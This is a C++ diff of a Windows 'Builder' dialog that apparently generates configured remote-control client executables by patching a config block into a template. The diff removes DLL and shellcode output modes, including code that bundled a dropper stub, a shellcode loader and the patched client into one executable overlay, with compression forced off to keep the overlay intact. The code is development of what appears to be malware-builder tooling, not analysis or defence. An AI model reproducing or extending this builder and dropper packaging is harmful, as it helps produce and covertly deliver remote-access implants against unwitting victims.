@@ -44,8 +44,6 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
         HWND hComboExeType = GetDlgItem(hDlg, IDC_COMBO_EXE_TYPE);
         if (hComboExeType) {
             SendMessageW(hComboExeType, CB_ADDSTRING, 0, (LPARAM)L"Client.exe");
-            SendMessageW(hComboExeType, CB_ADDSTRING, 0, (LPARAM)L"Client.dll");
-            SendMessageW(hComboExeType, CB_ADDSTRING, 0, (LPARAM)L"ShellCode");
             SendMessageW(hComboExeType, CB_SETCURSEL, 0, 0);
         }
         
@@ -189,32 +187,15 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                 // ... logic for both handled by BuildOne callers
             }
 
-            // 获取生成类型
-            wchar_t szExeType[64];
-            GetDlgItemTextW(hDlg, IDC_COMBO_EXE_TYPE, szExeType, 64);
-            std::wstring sExeType = szExeType;
-            bool isDll = (sExeType == L"Client.dll");
-            bool isShellCode = (sExeType == L"ShellCode");
-
             // 从内存加载模块
             wchar_t szSavePath[MAX_PATH] = L"Client.exe";
-            if (isDll) wcscpy_s(szSavePath, L"Client.dll");
-            else if (isShellCode) wcscpy_s(szSavePath, L"Client.bin");
 
             OPENFILENAMEW ofn = { 0 };
             ofn.lStructSize = sizeof(ofn);
             ofn.hwndOwner = hDlg;
             
-            if (isDll) {
-                ofn.lpstrFilter = L"动态链接库 (*.dll)\0*.dll\0所有文件 (*.*)\0*.*\0";
-                ofn.lpstrDefExt = L"dll";
-            } else if (isShellCode) {
-                ofn.lpstrFilter = L"可执行文件 (*.exe)\0*.exe\0二进制文件 (*.bin)\0*.bin\0所有文件 (*.*)\0*.*\0";
-                ofn.lpstrDefExt = L"exe";
-            } else {
-                ofn.lpstrFilter = L"可执行文件 (*.exe)\0*.exe\0所有文件 (*.*)\0*.*\0";
-                ofn.lpstrDefExt = L"exe";
-            }
+            ofn.lpstrFilter = L"可执行文件 (*.exe)\0*.exe\0所有文件 (*.*)\0*.*\0";
+            ofn.lpstrDefExt = L"exe";
 
             ofn.lpstrFile = szSavePath;
             ofn.nMaxFile = MAX_PATH;
@@ -267,15 +248,11 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
 
             auto BuildOne = [&](bool x64, const std::wstring& dest) -> bool {
                 std::vector<char> buffer;
-                // 资源ID暂且保留，若资源不存在则回退到文件加载
-                int resId = 0;
-                if (!isDll && !isShellCode) resId = x64 ? IDR_CLIENT_EXE_X64 : IDR_CLIENT_EXE_X86;
-                // DLL和ShellCode暂无资源定义，直接走文件加载逻辑
+                int resId = x64 ? IDR_CLIENT_EXE_X64 : IDR_CLIENT_EXE_X86;
                 
                 if (resId == 0 || !GetResourceData(resId, buffer)) {
                     std::wstring fileName;
-                    if (isDll) fileName = L"ClientDLL.dll";
-                    else fileName = L"Client.exe"; // ShellCode模式也使用Client.exe作为基础进行Patch
+                    fileName = L"Client.exe";
 
                     std::wstring templatePath = FindTemplateFile(fileName, x64);
                     
@@ -291,7 +268,7 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                     } 
                     
                     if (buffer.empty()) {
-                        std::wstring msg = L"无法找到模板文件: " + fileName + L"\n请确认已编译 Client/ClientDLL 项目。\n尝试过的路径包括当前目录及 ../x86, ../x64 等。";
+                        std::wstring msg = L"无法找到模板文件: " + fileName + L"\n请确认已编译 Client 项目。\n尝试过的路径包括当前目录及 ../x86, ../x64 等。";
                         MessageBoxW(hDlg, msg.c_str(), L"错误", MB_ICONERROR);
                         return false;
                     }
@@ -352,93 +329,6 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                 if (!found) {
                      MessageBoxW(hDlg, L"模板文件中未找到配置特征码 FRMD26_CONFIG，请确认模板是否最新。", L"错误", MB_ICONERROR);
                      return false;
-                }
-
-                // 如果是 ShellCode 模式，需要打包 Dropper
-                if (isShellCode) {
-                    // 1. 读取 Dropper.exe
-                    std::wstring dropperPath = FindTemplateFile(L"Dropper.exe", x64);
-                    if (dropperPath.empty()) {
-                        MessageBoxW(hDlg, L"无法找到 Dropper.exe 模板文件", L"错误", MB_ICONERROR);
-                        return false;
-                    }
-                    
-                    std::vector<char> dropperData;
-                    HANDLE hFile = CreateFileW(dropperPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-                    if (hFile != INVALID_HANDLE_VALUE) {
-                        DWORD size = GetFileSize(hFile, NULL);
-                        dropperData.resize(size);
-                        DWORD read;
-                        ReadFile(hFile, dropperData.data(), size, &read, NULL);
-                        CloseHandle(hFile);
-                    }
-
-                    // 2. 读取 ShellCodeLoader.exe
-                    std::wstring loaderPath = FindTemplateFile(L"ShellCodeLoader.exe", x64);
-                    if (loaderPath.empty()) {
-                        MessageBoxW(hDlg, L"无法找到 ShellCodeLoader.exe 模板文件", L"错误", MB_ICONERROR);
-                        return false;
-                    }
-
-                    std::vector<char> loaderData;
-                    hFile = CreateFileW(loaderPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-                    if (hFile != INVALID_HANDLE_VALUE) {
-                        DWORD size = GetFileSize(hFile, NULL);
-                        loaderData.resize(size);
-                        DWORD read;
-                        ReadFile(hFile, loaderData.data(), size, &read, NULL);
-                        CloseHandle(hFile);
-                    }
-
-                    if (dropperData.empty() || loaderData.empty()) {
-                         MessageBoxW(hDlg, L"读取 Dropper 或 ShellCodeLoader 失败", L"错误", MB_ICONERROR);
-                         return false;
-                    }
-
-                    // 3. 构造 Payload 数据包
-                    // 结构: [Count(4)] + Files...
-                    std::vector<char> payloadData;
-                    uint32_t count = 2; // ShellCodeLoader.exe + Client.bin
-                    
-                    auto appendInt = [&](uint32_t v) {
-                        char* p = (char*)&v;
-                        payloadData.insert(payloadData.end(), p, p + 4);
-                    };
-                    
-                    auto appendFile = [&](const std::wstring& name, const std::vector<char>& data) {
-                        uint32_t nameLen = (uint32_t)name.length();
-                        appendInt(nameLen);
-                        const char* pName = (const char*)name.c_str();
-                        payloadData.insert(payloadData.end(), pName, pName + nameLen * 2); // wchar_t is 2 bytes
-                        appendInt((uint32_t)data.size());
-                        payloadData.insert(payloadData.end(), data.begin(), data.end());
-                    };
-
-                    appendInt(count);
-                    appendFile(L"ShellCodeLoader.exe", loaderData);
-                    appendFile(L"Client.bin", buffer); // buffer is the patched Client.exe
-
-                    // 4. 组合最终文件
-                    // [Dropper] [Payload] [PayloadStart(4)] [RunTarget(4)] [Signature(8)]
-                    std::vector<char> finalExe = dropperData;
-                    uint32_t payloadStart = (uint32_t)finalExe.size();
-                    
-                    finalExe.insert(finalExe.end(), payloadData.begin(), payloadData.end());
-                    
-                    char* pStart = (char*)&payloadStart;
-                    finalExe.insert(finalExe.end(), pStart, pStart + 4);
-                    
-                    uint32_t runTarget = 0; // ShellCodeLoader.exe is index 0
-                    char* pRun = (char*)&runTarget;
-                    finalExe.insert(finalExe.end(), pRun, pRun + 4);
-                    
-                    const char* sig = "FRMDDROP";
-                    finalExe.insert(finalExe.end(), sig, sig + 8);
-                    
-                    buffer = finalExe; // Use finalExe as the buffer to write
-                    
-                    // 强制禁用压缩，防止 UPX 破坏附加数据 (Overlay)
-                    const_cast<int&>(compressIndex) = 0; 
                 }
 
                 // 写入临时文件或目标文件
